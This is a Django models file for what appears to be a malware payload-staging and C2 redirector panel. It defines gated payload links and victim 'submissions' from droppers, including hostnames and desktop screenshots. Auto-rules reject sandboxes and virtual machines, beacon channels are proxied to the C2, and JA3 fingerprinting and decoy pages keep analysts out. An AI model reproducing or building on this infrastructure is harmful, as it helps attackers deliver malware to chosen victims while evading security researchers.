import secrets

from django.conf import settings
from django.core.exceptions import ValidationError
from django.db import models
from django.utils import timezone


def validate_gate_path(value):
    base = getattr(settings, "GATE_BASE_PATH", "/g/")
    if not value.startswith("/"):
        raise ValidationError("Path must start with '/'.")
    if not value.startswith(base):
        raise ValidationError(f"Gate paths must live under the public base path '{base}' so nginx can route them to the control plane.")


def validate_redirector_domain(value):
    if not value:
        return
    import re
    if not re.fullmatch(r"[A-Za-z0-9.-]+", value):
        raise ValidationError("Domain must be a bare hostname (no scheme or path).")
    allowed = getattr(settings, "REDIRECTOR_DOMAINS", [])
    if allowed and value not in allowed:
        raise ValidationError(f"Domain '{value}' is not in the configured REDIRECTOR_DOMAINS list.")


def validate_auto_rules(value):
    """Validate the auto-decision DSL stored on DeliveryLink.auto_rules.

    Shape: a list of rules; the first matching rule decides the submission.
        [{"action": "approve" | "deny",
          "when": {"fields_match": {"hostname": "^corp-.*"},
                   "forbid": ["vmware|vbox", "sandbox"],
                   "require_images": true}}]
    """
    import re

    if value in (None, ""):
        return
    if not isinstance(value, list):
        raise ValidationError("Auto rules must be a list of rule objects.")
    for index, rule in enumerate(value):
        if not isinstance(rule, dict):
            raise ValidationError(f"Rule {index} must be an object.")
        if rule.get("action") not in {"approve", "deny"}:
            raise ValidationError(f"Rule {index}: 'action' must be 'approve' or 'deny'.")
        when = rule.get("when", {})
        if not isinstance(when, dict):
            raise ValidationError(f"Rule {index}: 'when' must be an object.")
        fields_match = when.get("fields_match", {})
        if not isinstance(fields_match, dict):
            raise ValidationError(f"Rule {index}: 'fields_match' must be an object of field -> regex.")
        for field, pattern in fields_match.items():
            if not isinstance(pattern, str):
                raise ValidationError(f"Rule {index}: pattern for field '{field}' must be a string.")
            try:
                re.compile(pattern)
            except re.error as exc:
                raise ValidationError(f"Rule {index}: invalid regex for field '{field}': {exc}")
        forbid = when.get("forbid", [])
        if not isinstance(forbid, list) or not all(isinstance(p, str) for p in forbid):
            raise ValidationError(f"Rule {index}: 'forbid' must be a list of regex strings.")
        for pattern in forbid:
            try:
                re.compile(pattern)
            except re.error as exc:
                raise ValidationError(f"Rule {index}: invalid 'forbid' regex: {exc}")
        if "require_images" in when and not isinstance(when["require_images"], bool):
            raise ValidationError(f"Rule {index}: 'require_images' must be a boolean.")


class DeliveryLink(models.Model):
    """An operator-controlled URL that gates access to keys, payloads, or proxied content."""

    KIND_CHOICES = [
        ("key", "Display a key"),
        ("file", "Gated file download"),
        ("proxy", "Proxy content from pwndrop"),
    ]
    GATE_CHOICES = [
        ("none", "No gate"),
        ("token", "Static shared token"),
        ("totp", "Time-based code (TOTP-style)"),
        ("submission", "Requires encrypted info submission"),
    ]
    CIPHER_CHOICES = [
        ("none", "None"),
        ("base64", "Base64"),
        ("xor", "XOR"),
        ("aes256", "AES-256-CBC"),
    ]
    PLACEHOLDER_CHOICES = [
        ("blank", "Blank 204 response"),
        ("placeholder", "Placeholder page"),
        ("decoy", "Decoy page"),
    ]
    DENY_CHOICES = [
        ("not_found", "404"),
        ("decoy", "Decoy page"),
        ("benevolent", "Benevolent payload / message"),
    ]
    STATUS_CHOICES = [
        ("pending", "Pending"),
        ("approved", "Approved"),
        ("denied", "Denied"),
    ]

    path = models.CharField(max_length=240, unique=True, validators=[validate_gate_path],
                            help_text="Public path, e.g. /g/updates/x7Q9. Must start with the configured gate base path.")
    kind = models.CharField(max_length=10, choices=KIND_CHOICES)
    label = models.CharField(max_length=120, blank=True)
    agent_label = models.CharField(max_length=120, blank=True, help_text="Free-form tag, e.g. agent/build name this link was generated for.")

    key_text = models.TextField(blank=True, help_text="Plain content for kind=key.")
    pwndrop_url = models.URLField(blank=True, help_text="Source URL fetched server-side for kind=proxy (pwndrop location is never exposed to the client).")
    payload = models.FileField(upload_to="payloads/", blank=True, null=True)
    benevolent_text = models.TextField(blank=True, help_text="Plain response served when a request is denied and on_deny=benevolent.")
    benevolent_file = models.FileField(upload_to="benevolent/", blank=True, null=True)

    gate_type = models.CharField(max_length=12, choices=GATE_CHOICES, default="none")
    gate_token = models.CharField(max_length=200, blank=True, help_text="Static shared token for gate_type=token.")
    totp_secret = models.CharField(max_length=200, blank=True, help_text="Secret for gate_type=totp.")
    totp_window = models.PositiveIntegerField(default=30, help_text="Seconds per TOTP window.")
    cipher = models.CharField(max_length=10, choices=CIPHER_CHOICES, default="none",
                              help_text="How submitted blobs are decoded/decrypted for gate_type=submission.")
    cipher_key = models.CharField(max_length=200, blank=True, help_text="Hex or passphrase key for xor/aes256.")
    cipher_iv = models.CharField(max_length=64, blank=True, help_text="IV for aes256 (hex).")
    expected_fields = models.JSONField(default=list, blank=True,
                                       help_text="JSON list of field names that must exist in the decrypted submission.")

    placeholder = models.CharField(max_length=12, choices=PLACEHOLDER_CHOICES, default="blank")
    on_deny = models.CharField(max_length=12, choices=DENY_CHOICES, default="not_found")

    requires_approval = models.BooleanField(default=False, help_text="Verification gate: an operator must approve before content is released.")
    auto_rules = models.JSONField(default=list, blank=True, validators=[validate_auto_rules],
                                  help_text="Optional auto-decision rules (JSON). First matching rule approves/denies; no match stays manual.")
    domain = models.CharField(max_length=253, blank=True, validators=[validate_redirector_domain],
                              help_text="Which redirector domain serves this link (must be in REDIRECTOR_DOMAINS when configured).")
    ja3_fingerprint = models.CharField(max_length=64, blank=True,
                                       help_text="Require this JA3 hash (set by an OpenResty fingerprint front layer via X-JA3-Fingerprint).")
    ja4_fingerprint = models.CharField(max_length=64, blank=True,
                                       help_text="Require this JA4 hash (X-JA4-Fingerprint header).")
    watermark = models.BooleanField(default=False,
                                    help_text="Append a unique per-release marker to served content so leaks trace back to this link and use.")
    approval_status = models.CharField(max_length=10, choices=STATUS_CHOICES, default="pending")
    decided_by = models.ForeignKey(settings.AUTH_USER_MODEL, null=True, blank=True, on_delete=models.SET_NULL, related_name="gate_decisions")
    decided_at = models.DateTimeField(null=True, blank=True)

    one_time = models.BooleanField(default=False, help_text="Deactivate automatically after the first successful release.")
    max_uses = models.PositiveIntegerField(default=0, help_text="0 = unlimited. Otherwise the link deactivates after this many releases.")
    expires_at = models.DateTimeField(null=True, blank=True)
    active = models.BooleanField(default=True)
    hit_count = models.PositiveIntegerField(default=0)
    created_by = models.ForeignKey(settings.AUTH_USER_MODEL, null=True, blank=True, on_delete=models.SET_NULL, related_name="delivery_links")
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        ordering = ["-created_at"]

    def __str__(self):
        return f"{self.path} ({self.kind})"

    @property
    def expired(self):
        return bool(self.expires_at and timezone.now() >= self.expires_at)

    @property
    def uses_exhausted(self):
        return bool(self.max_uses and self.hit_count >= self.max_uses)

    @property
    def available(self):
        return self.active and not self.expired and not self.uses_exhausted

    def register_release(self):
        """Atomically count a release and enforce one-time/use limits.

        Returns True when this call won the release; False when the link was
        concurrently exhausted by another request.
        """
        from django.db.models import F, Q
        won = DeliveryLink.objects.filter(
            pk=self.pk, active=True).filter(
            Q(max_uses=0) | Q(hit_count__lt=F("max_uses"))).update(
            hit_count=F("hit_count") + 1)
        if not won:
            return False
        exhausted = self.one_time or (self.max_uses and self.hit_count + 1 >= self.max_uses)
        if exhausted:
            DeliveryLink.objects.filter(pk=self.pk).update(active=False)
        self.refresh_from_db()
        return True


class Submission(models.Model):
    """A decrypted info package received from a dropper/loader awaiting an operator decision."""

    link = models.ForeignKey(DeliveryLink, on_delete=models.CASCADE, related_name="submissions")
    raw_blob = models.TextField(blank=True)
    decoded_json = models.JSONField(default=dict, blank=True)
    status = models.CharField(max_length=10, choices=DeliveryLink.STATUS_CHOICES, default="pending", db_index=True)
    decided_by = models.ForeignKey(settings.AUTH_USER_MODEL, null=True, blank=True, on_delete=models.SET_NULL, related_name="submission_decisions")
    decided_at = models.DateTimeField(null=True, blank=True)
    client_ip_hash = models.CharField(max_length=64, blank=True)
    raw_ip = models.GenericIPAddressField(null=True, blank=True,
                                          help_text="Raw client address; never shown in the panel, used for bans and burn notices.")
    user_agent = models.TextField(blank=True)
    note = models.TextField(blank=True)
    note_by = models.ForeignKey(settings.AUTH_USER_MODEL, null=True, blank=True, on_delete=models.SET_NULL, related_name="submission_notes")
    note_at = models.DateTimeField(null=True, blank=True)
    served_after_decision = models.BooleanField(default=False,
                                                help_text="Set when content was released after this decision; blocks undo.")
    created_at = models.DateTimeField(auto_now_add=True, db_index=True)

    class Meta:
        ordering = ["-created_at"]

    def __str__(self):
        return f"submission #{self.pk} for {self.link.path}"


class SubmissionImage(models.Model):
    """An image (e.g. desktop screenshot) extracted from a decoded submission."""

    submission = models.ForeignKey(Submission, on_delete=models.CASCADE, related_name="images")
    field_name = models.CharField(max_length=120)
    image = models.FileField(upload_to="submission_images/")
    content_type = models.CharField(max_length=40, default="image/png")
    created_at = models.DateTimeField(auto_now_add=True)


class BannedIP(models.Model):
    ip = models.GenericIPAddressField(unique=True)
    note = models.CharField(max_length=240, blank=True)
    active = models.BooleanField(default=True, db_index=True)
    auto_created = models.BooleanField(default=False)
    created_by = models.ForeignKey(settings.AUTH_USER_MODEL, null=True, blank=True, on_delete=models.SET_NULL, related_name="ip_bans")
    created_at = models.DateTimeField(auto_now_add=True)
    expires_at = models.DateTimeField(null=True, blank=True)

    class Meta:
        ordering = ["-created_at"]

    def __str__(self):
        return self.ip

    @property
    def expired(self):
        return bool(self.expires_at and timezone.now() >= self.expires_at)

    @classmethod
    def is_banned(cls, ip):
        return cls.objects.filter(ip=ip, active=True).exclude(
            expires_at__isnull=False, expires_at__lte=timezone.now()
        ).exists()


def agent_token():
    return secrets.token_urlsafe(9)


class AgentChannel(models.Model):
    """A per-agent beacon URL segment: /a/<token> with its own UA validation, proxied to the C2 by nginx."""

    label = models.CharField(max_length=120)
    token = models.CharField(max_length=32, unique=True, default=agent_token)
    ua_pattern = models.CharField(max_length=240, blank=True, help_text="Regex; requests must match to be proxied to the C2. Empty allows all UAs.")
    note = models.CharField(max_length=240, blank=True)
    active = models.BooleanField(default=True)
    hits = models.PositiveIntegerField(default=0)
    last_seen_at = models.DateTimeField(null=True, blank=True)
    created_by = models.ForeignKey(settings.AUTH_USER_MODEL, null=True, blank=True, on_delete=models.SET_NULL, related_name="agent_channels")
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        ordering = ["-created_at"]

    def __str__(self):
        return f"/a/{self.token} ({self.label})"

    @property
    def path(self):
        return f"{getattr(settings, 'AGENT_BASE_PATH', '/a/')}{self.token}"


class BotState(models.Model):
    """Small persistent state for the Telegram polling worker (update offset)."""

    key = models.CharField(max_length=40, unique=True)
    offset = models.BigIntegerField(default=0)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"{self.key}@{self.offset}"


# Decoy pages shipped with the repository. Operators pick one as the default
# shown for unmatched paths, rejected browsing, and gate denials; `path` is
# relative to the repository root, never built from user input.
BUILTIN_DECOYS = {
    "update-service": {
        "label": "Update Service",
        "path": "templates/gates/decoy.html",
        "template_name": "gates/decoy.html",
        "django_template": True,
    },
    "nysm-landing": {
        "label": "NYSM landing page",
        "path": "decoy/index.html",
        "django_template": False,
    },
    "maintenance": {
        "label": "Maintenance page",
        "path": "decoy/maintenance.html",
        "django_template": False,
    },
    "crestfield": {
        "label": "Crestfield status page (example)",
        "path": "decoy_examples/Crestfield.html",
        "django_template": False,
    },
}


def seed_builtin_decoys():
    """Create rows for the built-in decoy pages; select the historical default."""
    from django.apps import apps
    DecoyPage = apps.get_model("gates", "DecoyPage")
    for key, meta in BUILTIN_DECOYS.items():
        _, created = DecoyPage.objects.get_or_create(
            kind="template", template_key=key,
            defaults={"name": meta["label"], "active": True})
    if not DecoyPage.objects.filter(is_default=True).exists():
        default = DecoyPage.objects.filter(template_key="update-service").first()
        if default is not None:
            DecoyPage.objects.filter(pk=default.pk).update(is_default=True)


class DecoyPage(models.Model):
    """A page served to rejected or lost visitors; one is the default."""

    KIND_CHOICES = [
        ("template", "Built-in page"),
        ("upload", "Uploaded HTML"),
        ("redirect", "Redirect to URL"),
    ]

    name = models.CharField(max_length=120)
    kind = models.CharField(max_length=10, choices=KIND_CHOICES)
    template_key = models.CharField(max_length=40, blank=True)
    html_file = models.FileField(upload_to="decoys/", blank=True, null=True)
    redirect_url = models.URLField(blank=True)
    active = models.BooleanField(default=True)
    is_default = models.BooleanField(default=False)
    created_by = models.ForeignKey(settings.AUTH_USER_MODEL, null=True, blank=True,
                                   on_delete=models.SET_NULL, related_name="decoy_pages")
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        ordering = ["-is_default", "-created_at"]

    def __str__(self):
        return f"{self.name} ({self.get_kind_display()})"

    def clean(self):
        from django.core.exceptions import ValidationError
        if self.kind == "template" and self.template_key not in BUILTIN_DECOYS:
            raise ValidationError({"template_key": "unknown built-in decoy page"})
        if self.kind == "upload" and not self.html_file:
            raise ValidationError({"html_file": "upload an HTML file"})
        if self.kind == "redirect" and not self.redirect_url:
            raise ValidationError({"redirect_url": "set the redirect URL"})


class HitEvent(models.Model):
    """Unified tracking for everything that touches the public surface."""

    CATEGORY_CHOICES = [
        ("hit", "Gate hit"),
        ("key_served", "Key served"),
        ("download", "Download released"),
        ("awaiting_approval", "Awaiting approval"),
        ("approved", "Approved"),
        ("disapproved", "Disapproved"),
        ("expired", "Expired link hit"),
        ("banned", "Banned IP hit"),
        ("not_found", "Untracked path"),
        ("suspicious", "Suspicious activity"),
        ("canary", "Decoy canary re-hit"),
    ]

    category = models.CharField(max_length=20, choices=CATEGORY_CHOICES, db_index=True)
    path = models.TextField(blank=True)
    link = models.ForeignKey(DeliveryLink, null=True, blank=True, on_delete=models.SET_NULL, related_name="hit_events")
    agent_channel = models.ForeignKey(AgentChannel, null=True, blank=True, on_delete=models.SET_NULL, related_name="hit_events")
    ip_hash = models.CharField(max_length=64, blank=True, db_index=True)
    raw_ip = models.GenericIPAddressField(null=True, blank=True)
    user_agent = models.TextField(blank=True)
    status_code = models.PositiveSmallIntegerField(default=200)
    detail = models.JSONField(default=dict, blank=True)
    created_at = models.DateTimeField(auto_now_add=True, db_index=True)

    class Meta:
        ordering = ["-created_at"]
        indexes = [models.Index(fields=["category", "created_at"])]
